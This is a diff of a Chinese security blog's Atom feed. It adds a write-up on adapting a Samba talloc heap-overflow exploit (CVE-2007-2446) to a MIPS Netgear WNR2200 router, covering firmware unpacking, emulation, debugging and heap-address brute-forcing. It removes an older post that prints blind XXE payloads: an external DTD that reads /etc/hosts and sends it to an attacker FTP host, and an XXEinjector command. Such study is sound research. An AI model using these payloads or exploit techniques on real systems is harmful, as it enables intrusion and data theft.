@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xdxd.love/"/>
-  <updated>2017-09-13T07:43:06.000Z</updated>
+  <updated>2017-10-30T03:16:09.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -14,6 +14,131 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>netgear WNR2200的一个heap overflow漏洞利用</title>
+    <link href="http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2017/10/16/netgear-WNR2200的一个heap-overflow漏洞利用/</id>
+    <published>2017-10-16T10:20:17.000Z</published>
+    <updated>2017-10-30T03:16:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全的新版本。</p>
+<p>但是由于嵌入式设备为了省电的原因通常都是使用RISC架构的CPU，比如ARM和MIPS。而目前的大部分exploit都是针对X86的，针对RISC的POC相对较少也导致嵌入式设备的安全没有得到足够的重视。</p>
+<p>本篇博客介绍将一个已知的x86的exploit修改成适用于mips架构的过程。分析对象为netgear WNR2200路由器。</p>
+<h2 id="固件分析">固件分析</h2><p>为了寻找合适的exploit，需要先对固件进行分析。从网上可以下载到<br> (version 1.0.1.96) 版本的固件，解压之后发现是个img后缀的文件。使用binwalk进行分析如下：</p>
+<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+<span class="number">192</span>           <span class="number">0xC0</span>            Squashfs filesystem, big endian,
+version <span class="number">3.0</span>, size: <span class="number">6033818</span> bytes,{jump-to-offset:<span class="number">6033818</span>}{file-size:<span class="number">6033818</span>}
+<span class="number">1379</span> inodes, blocksize: <span class="number">65536</span> bytes, created: Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
+<span class="number">336044</span>        <span class="number">0x520AC</span>         LZMA compressed data, properties:
+<span class="number">0x5D</span>, dictionary size: <span class="number">8388608</span> bytes, uncompressed size: <span class="number">2740358</span> bytes
+</code></pre><p>根据分析结果，binwalk识别出在这个文件中包含一个squashFS格式的文件系统。使用unsquashfs工具进行分析。命令为<br>“unsquashfs –s”</p>
+<pre><code>Reading a different endian SQUASHFS filesystem <span class="function_start"><span class="keyword">on</span></span> C0.squashfs
+Found a valid big endian SQUASHFS <span class="number">3</span>:<span class="number">0</span> superblock <span class="function_start"><span class="keyword">on</span></span> C0.squashfs.
+Creation <span class="keyword">or</span> <span class="keyword">last</span> append <span class="property">time</span> Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
+Filesystem size <span class="number">5892.40</span> Kbytes (<span class="number">5.75</span> Mbytes)
+Block size <span class="number">65536</span>
+Filesystem <span class="keyword">is</span> <span class="keyword">not</span> exportable via NFS
+Inodes are compressed
+Data <span class="keyword">is</span> compressed
+Fragments are compressed
+Always_use_fragments option <span class="keyword">is</span> <span class="keyword">not</span> specified
+Check data <span class="keyword">is</span> <span class="keyword">not</span> present <span class="keyword">in</span> <span class="keyword">the</span> filesystem
+Duplicates are removed
+Number <span class="keyword">of</span> fragments <span class="number">101</span>
+Number <span class="keyword">of</span> inodes <span class="number">1379</span>
+Number <span class="keyword">of</span> uids <span class="number">1</span>
+Number <span class="keyword">of</span> gids <span class="number">0</span>
+</code></pre><p>这也确认了固件文件中确实存在一个有效的SquashFS格式的文件系统。然后尝试进行解压，程序报错。</p>
+<pre><code>Reading a different endian SQUASHFS filesystem <span class="keyword">on</span> C0.squashfs
+<span class="keyword">Parallel</span> unsquashfs: <span class="keyword">Using</span> <span class="number">8</span> processors
+gzip uncompress failed <span class="keyword">with</span> error code -<span class="number">3</span>
+read_block: failed <span class="keyword">to</span> <span class="keyword">read</span> <span class="keyword">block</span> @<span class="number">0</span>x5c0f6d
+read_fragment_table: failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table <span class="keyword">block</span>
+FATAL ERROR:failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table
+</code></pre><p>通过对这个错误信息进行调查分析，得知可能是使用了非标准的squashfs进行的压缩。我下载了最新版的SquashFS工具，重新进行编译。但是还是解压失败。更进一步的分析发现Firmware Mod Kit这个工具可能可以解压这个固件，虽然FMK这个工具好久不更新了。最后使用FMK的unsquashfs_all脚本，成功解压了固件。程序识别出，固件使用的squashfs版本为”./src/squashfs-3.0/mksquashfs-lzma”。</p>
+<p>解压之后发现是一个基于OpenWRT的linux系统。老的Netgear路由器通过发送一个特定的包可以打开telent，具体的<a href="https://wiki.openwrt.org/toh/netgear/telnet.console" target="_blank" rel="external">技术分析参考</a>。连上telnet之后可以获得OpenWRT的版本为Kamikaze。</p>
+<pre><code>BusyBox v1.4.2 (2013-12-23 15:48:24 CST) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+ _______                     ________        __ 
+|<span class="string">       </span>|<span class="string">.-----.-----.-----.</span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">.----.</span>|<span class="string">  </span>|<span class="string">_ 
+</span>|<span class="string">   -   </span>||<span class="string">  _  </span>|<span class="string">  -__</span>|<span class="string">     </span>||<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">   _</span>||<span class="string">   _</span>|<span class="string"> 
+</span>|<span class="string">_______</span>||<span class="string">   __</span>|<span class="string">_____</span>|<span class="string">__</span>|<span class="string">__</span>||<span class="string">________</span>||<span class="string">__</span>|<span class="string">  </span>|<span class="string">____</span>|
+         |<span class="string">__</span>|<span class="string"> W I R E L E S S   F R E E D O M
+KAMIKAZE (7.09)
+-----------------------------------
+ - 10 oz Vodka       Shake well with ice and strain
+ - 10 oz Triple sec  mixture into 10 shot glasses.
+ - 10 oz lime juice  Salute!
+---------------------------------------------------
+root@WNR2200:/#</span>
+</code></pre><p>其他的版本信息<br><img src="/images/netgearsamba1.jpg" alt=""></p>
+<p>很幸运，samba和linux kernel的版本都很低，更容易找到相对应的漏洞利用。</p>
+<h2 id="虚拟机运行samba进程">虚拟机运行samba进程</h2><p>现在我们有了整个解压之后的虚拟机固件，第一步是想在qemu虚拟机中运行起来，当然我们选择只是虚拟运行samba进程。</p>
+<p>首先需要安装qemu-static相关的程序。然后把“qemu-mips-static”复制到固件的根目录，之后使用chroot切换到固件的根目录执行。命令如下：</p>
+<pre><code>“sudo chroot . ./qemu-mips-<span class="keyword">static</span> -g <span class="number">5656</span> ./usr/sbin/smbd -i -d <span class="number">10</span> &gt; fileout.txt”
+</code></pre><p>具体解释一下这个命令：</p>
+<p>1，chroot到固件的目录下，这样samba就可以认为固件目录是文件根目录。可以加载相关的lib库文件。</p>
+<p>2，使用qemu虚拟运行samba。g参数是开启gdb调试，监听在5656端口。</p>
+<p>3，d参数是设置调试模式为最高10。这样可以输出更多的调试信息。</p>
+<p>4，重定向输出信息到文件里，方便后期查看。</p>
+<p>运行这个文件的时候，会遇到一些问题。提示samba找不到smb.conf文件。在正常运行的路由器里查看，在/tmp目录有一些配置文件，但是在解压出来的固件里这个目录是空白的。可见这些文件是系统启动的时候，动态创建的。所以我们需要手动创建这些缺失的文件。</p>
+<p>主要涉及到以下文件：</p>
+<p>/etc/init.d/samba  这个文件会动态创建所需要的目录，复制配置到/tmp目录。然后执行下面的2个程序。</p>
+<p>/usr/sbin/update_user 一个bash脚本。在/tmp/passwd文件中写入用户信息。</p>
+<p>/usr/sbin/update_smb 一个二进制文件。更新tmp目录下的smb.conf配置信息。</p>
+<p>bash脚本中的命令，可以手动一条条的执行。二进制文件使用 qemu-mips-static 模拟执行。最后检查/etc/目录中的相关软链接是否正确指向到了正确的文件。这时最开始的命令就可以正确执行了。</p>
+<h2 id="寻找漏洞">寻找漏洞</h2><p>对应的samba版本的源代码可以在这里<a href="https://download.samba.org/pub/samba/stable/" target="_blank" rel="external">下载</a> 。通过查找对应版本存在的CVE发现一个典型的堆溢出漏洞。这个数据中有一个数值用来分配缓冲区，然后程序利用第二个数值来解组数据，写进缓冲区。如果第一个数值小于第二个数值就会导致堆溢出漏洞。</p>
+<p>这个漏洞的编号是CVE-2007-2446。samba使用一个自定义的堆分配器talloc。talloc使用树形结构分配内存。在树形结构的任何一个节点都可以释放这个和他的子节点。为了实现这个特性，talloc实现了一个自定义的释放程序，他的指针保存在堆的元数据上，可以通过溢出覆盖。当一个chunk被释放的时候，通过覆盖堆的元数据可以实现任意代码执行。</p>
+<p>已经有个x86的<a href="https://www.exploit-db.com/exploits/16875/" target="_blank" rel="external">metasploit利用模块</a>。这会对我们想在MIPS目标上实现漏洞利用有比较大的帮助。</p>
+<h2 id="动态调试">动态调试</h2><p>现在我们已经已经可以用qemu虚拟机运行samba程序。使用IDA加载samba二进制文件，然后使用debugger模块可以进行远程调试。</p>
+<p>一开始调试我们就遇到了一个问题。IDA直接展示了进程的整个内存空间的扁平视图，但是IDA并没有正确识别出我们的二进制文件中的起始位置。这导致在内存视图中所有的符号都没有关联到正确的位置，甚至IDA都无法识别哪些区域是数据哪些区域是代码。在这样的环境中调试是比较困难的，因为我们无法再感兴趣的函数上断点，也无法知道当前运行的是哪个函数。下图展示了IDA加载了进程之后的内存布局<br><img src="/images/netgearsamba2.jpg" alt=""></p>
+<p>我一开始推测IDA停在的这个初始的点是在smbd的二进制程序中。但是通过比较smbd的main函数和二进制文件的入口点发现都不是。在这个断点处选取一些指令进行搜索，在smbd中却没有找到对应的结果。这让我觉得这段代码可能并不在smbd中。</p>
+<p>为了定位这个函数，我向后寻找到最近的一个页边界。获得了一些有用的信息。</p>
+<p>模块页边界 地址0x76436000<br><img src="/images/netgearsamba3.jpg" alt=""></p>
+<p>从上图可以看到ELF这个魔术值。通过分析头上的指令可以知道这是ld-uClibc.so.0中的代码。通过readelf分析smbd可以确定ld-uClibc.so.0是smbd的动态加载器。</p>
+<p>分析uClibc的代码发现这里可能是uClibc/ldso/ldso/mips/dl-startup.h相关的函数。函数中的最后一个跳转指令是跳到真正的二进制文件的入口点。单步调试跟踪到该跳转指令然后进入跳转，会让我们来到如下的代码处。<br><img src="/images/netgearsamba4.jpg" alt=""></p>
+<p>0x76CB76C0 处的代码看起来很像是二进制程序的入口点。__uClibc_main的调用指令也印证了这一点。</p>
+<p>我在IDA的反汇编里查找了一下__uClibc_main的交叉引用，结果有好几个。其中一个是上图中的函数。这个函数在二进制文件中的偏移是0x0003B6C0。使用内存中的地址0x76CB76C0减去二进制文件中的地址，得到在内存中的基址是0x76C7C000。然后使用IDA的rabase功能，填入正确的基址。这样调试的时候就可以看到正确的符号和函数名。</p>
+<p><img src="/images/netgearsamba5.jpg" alt=""></p>
+<h2 id="修改x86的利用程序">修改x86的利用程序</h2><p>首先需要修改的是获得一个针对mips的nop sled。因为内存布局不是百分百可以预测的，所有利用程序使用了nop sled技术来提高利用的成功率。所谓nop sled就是一堆什么都不做的处理器指令。它不会改变程序的状态。所以我们把一大段这种指令放在内存中，从这段指令的任何一个位置开始执行，都可以正常执行到我们真正的payload指令。这样可以提高成功率。</p>
+<p>在MIPS汇编语言中，最基本的nop指令就是0x00000000，对应的汇编语言为“sll $0, 0”。一共大概有接近170个MIPS指令可以作为没有副作用的NOP指令。</p>
+<p>如下图所示：</p>
+<p><img src="/images/netgearsamba6.jpg" alt=""></p>
+<h2 id="调试exploit">调试exploit</h2><p>本来也没有预期一次可以成功，第一次运行的时候在talloc_chunk_from_ptr函数中抛出了异常。<br><img src="/images/netgearsamba7.jpg" alt=""></p>
+<p>talloc_chunk_from_ptr函数的作用是传入内存地址，给出相应的chunk的header和metadata。此外它还会验证元数据中的魔术数字是否是有效的和当前内存是否已经释放。异常出现在图中标识的代码上方，当从$a0寄存器的某个偏移处加载数据时异常。在MIPS架构中，$a0寄存器用来传递函数的第一个参数。查看一下寄存器的值可以看到，$a0的值是0x41414141。漏洞利用程序覆盖了一个chunk 的header。导致一些header中一些重要的值(魔术字和一些重要的指针)。</p>
+<p><img src="/images/netgearsamba8.jpg" alt=""></p>
+<p>所以初步假设元数据中的几个指针(前一个chunk,后一个chunk，父节点和子节点)被覆盖成了不正确的值。检查exploit的代码发现只有next和prev两个指针被设置成了0x41414141。为了进一步确认我们的猜想，可以看一下crash时候的调用栈。</p>
+<p><img src="/images/netgearsamba9.jpg" alt=""></p>
+<p>在crash之前，talloc_total_size被调用。分析一下这个函数的代码可以证实我们的猜测。</p>
+<p><img src="/images/netgearsamba10.jpg" alt=""></p>
+<p>上图展示了talloc_total_size函数的源码。用来计算内存分配树某个特定分支的大小。这个函数是递归的，并在每次迭代时会调用talloc_chunk_from_prt函数(发生崩溃的函数)，参数是链表的指针。图中高亮的代码“c=c-&gt;next”就是那个错误的值进入了talloc_total_size函数，最终进入talloc_chunk_from_prt的根源。</p>
+<p>修复这个崩溃相对来说也比较简单。只要我们将覆盖头文件的next和prev指针的值修改为0x00000000,talloc_total_size中的循环将会提前终止，我们的指针就不会进入到后面的处理函数。</p>
+<p>修改这个点之后，exploit就成功运行了。程序计数器成功被我们的标记值覆盖。</p>
+<h2 id="重定向执行流程">重定向执行流程</h2><p>现有的exploit通过发送一个特定的SMB请求，在内存中创建一个巨大的nop sled。当这个缓冲区被解组的时候，会分配另一个缓冲区并写入数据溢出。溢出的talloc头部有一个函数指针被覆盖指向了原始缓冲区(nop sled位置)。由于堆内存的布局并不是百分百确定的，所以可以尝试暴力猜测，根据堆内存可能的位置每次每次使用不一样的控制指针。如果尝试失败，进程实例会被结束。因为samba是为每个进入的连接创建一个进程来处理，所以一个实例被杀掉是可以接受的。</p>
+<p>除了暴力尝试猜测堆地址，我们尝试找到一个更可控的方式来控制执行流程。MIPS比x86架构有更多的寄存器，所以当获得执行权限的时候，其中更可能存在一些可预测的和有利用价值的值。可能存在实现ROP利用的机会，而ROP的利用会更加稳定。经过分析，尽管部分寄存器指向堆上可控的数据，但是却是不可利用的。他们指向的是talloc头部被溢出覆盖的区域。因为talloc头部在被写入和执行之间会被修改，所以尝试在这个区域写入shellcode是没法成功的。尝试找一个带偏移的寄存器来绕过这段不稳定的区域但是没有成功，没有找到合适的gadget。</p>
+<p>既然没有找到更稳定的ROP利用，只好回到暴力堆地址的方法上来。在路由器上分析smbd的进程内存布局发现所有的实例的内存布局都是相同的，即使系统重新启动。这表明内核没有开启ASLR，内存布局都是可以预测的。有意思的是通过查看/proc/sys/kernel/randomize_va_space 文件的值为1。这表明内核认为ASLR已经开启了。</p>
+<p>想要找到合适的地址需要先知道堆的边界，通过查看“/proc//maps” 就可以。查看路由器的这个文件显示如图。<br><img src="/images/netgearsamba11.jpg" alt=""></p>
+<p>根据上图中的值，0x558be000到0x55965000可以作为暴力猜测的边界。</p>
+<p>悲伤的是，利用这个边界暴力猜测失败了，metasploit并没有返回session。在qemu模拟系统上进一步调试发现，只要堆的范围正确，exploit是可以成功利用的。虽然不是很清楚为啥失败了，但是通过增加暴力猜测的范围为0x558b0000 -  0x559c0000 ，程序利用成功了。<br><img src="/images/netgearsamba12.jpg" alt=""></p>
+<p>最终在在0x559b4000地址处，exploit成功利用。这个地址是稳定的，而且系统重启也不会发生变化。奇怪的是这个地址是在系统显示的堆的边界以外的。我还没有发现这个问题的根本原因，不过我猜测堆内存在运行过程中范围增加了，但是系统并没有恰当的跟踪好变化后的地址范围。</p>
+<h2 id="备注">备注</h2><p>1，解压固件使用最新版的binwalk已经可以直接解压。docker版binwalk工具：<a href="https://github.com/stayliv3/embedded-device-lab/tree/master/docker-binwalk" target="_blank" rel="external">download</a><br>2，metasploit已经更新了针对mips samba的exploit。可以直接成功利用。<br>3，<a href="https://www.contextis.com/blog/porting-exploits-netgear-wnr2200" target="_blank" rel="external">原文地址：</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全
+    
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+      <category term="万物互联" scheme="http://xdxd.love/tags/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
   
   <entry>
     <title>使用vscode远程调试docker容器内的php应用</title>
@@ -1278,48 +1403,6 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
     
     
       <category term="php" scheme="http://xdxd.love/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一个blind XXE漏洞利用工具XXEinjector</title>
-    <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
-    <published>2016-09-08T02:22:01.000Z</published>
-    <updated>2017-08-30T08:12:26.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a><br><a href="https://www.92aq.com/2016/01/31/xxeinjector-xxe.html" target="_blank" rel="external">XXEinjector – XXE自动化测试工具</a></p>
-<h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
-<p>测试payload:</p>
-<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
-</code></pre><h2 id="文件读取">文件读取</h2><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
-<pre><code><span class="string">.</span><span class="comment">/XXEinjector</span><span class="string">.</span><span class="comment">rb</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">host=22</span><span class="string">.</span><span class="comment">28</span><span class="string">.</span><span class="comment">98</span><span class="string">.</span><span class="comment">149</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file=/root/XXEinjector/test</span><span class="string">.</span><span class="comment">txt</span>  <span class="literal">-</span><span class="literal">-</span><span class="comment">path=/etc/hosts</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">verbose</span> 
-</code></pre><p>命令可以读取hosts文件。XXEinjector.rb会自动开启http服务提供恶意dtd和开启ftp服务接受传送回来的文件信息。</p>
-<p><img src="/images/onexxe3.png" alt=""></p>
-<p>经过抓包分析XXEinjector的工作原理。</p>
-<p>使用的第一个payload为：</p>
-<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://xxxxxx:80/file.dtd"&gt;%remote;%int;%trick;]&gt;</span><span class="tag">&lt;<span class="title">request</span> <span class="attribute">nickname</span>=<span class="value">"test"</span> <span class="attribute">serial</span>=<span class="value">"ELISALIVE2-"</span> <span class="attribute">user</span>=<span class="value">""</span> <span class="attribute">swd</span>=<span class="value">"+=="</span> <span class="attribute">port</span>=<span class="value">"0"</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span><span class="tag">&lt;/<span class="title">request</span>&gt;</span>
-</code></pre><p>file.dtd内容为：</p>
-<pre><code>&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% payl SYSTEM "file:///etc/hosts"&gt;</span>
-&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://xxxxxxx:21/%payl;'&gt;"&gt;</span>
-</code></pre><p>然后ftp就会接受到hosts文件数据。</p>
-<p>使用提取的payload用burp测试可以获取数据。<br><img src="/images/onexxe2.png" alt=""></p>
-<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet)，根据相应的库的方式禁用外部实体解析。</p>
-<h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
-<h2 id="更新">更新</h2><p>遇到一个XXE的环境，使用简单payload测试，可以对外发起http请求。但是直接使用XXEinjector，无法获得数据，第二个请求一直发不出来，使用oob参数为http可以成功利用。因为oob默认使用ftp。可能是这个环境中ftp端口是不通的。</p>
-<p>当时的测试思路是自己修改恶意dtd文件，替换为简单的发起http请求，发现可以成功，然后再增加嵌套。最终定位为可以利用。应该可以理解成只要可以发出一个http请求，那么漏洞一定就是可以利用的。只是使用oob为http，只能读取文件内容的一行。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.t00ls.net/articles-32919.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;关于Blind XXE&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;htt
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
     
   </entry>
   
